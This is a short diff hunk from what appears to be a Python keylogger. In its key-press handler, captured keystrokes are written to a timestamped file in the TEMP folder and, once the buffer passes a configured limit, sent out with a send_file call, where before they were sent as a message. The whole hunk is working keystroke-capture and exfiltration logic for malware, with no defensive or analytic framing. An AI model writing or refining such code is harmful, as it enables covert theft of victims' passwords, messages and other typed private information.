@@ -119,7 +119,11 @@ def on_press(key):
     except :
         pass
     if len(key_buffer) > int(config["main"]["keylimit"]):
-        send_message(key_buffer+"\n\n"+caption)
+        fname = os.environ["TEMP"]+"/"+str(time.time())+".txt".replace("\\","/")
+        f = open(fname,"w")
+        f.write(key_buffer)
+        f.close()
+        send_file(fname,caption)
         key_buffer = ""
 
 
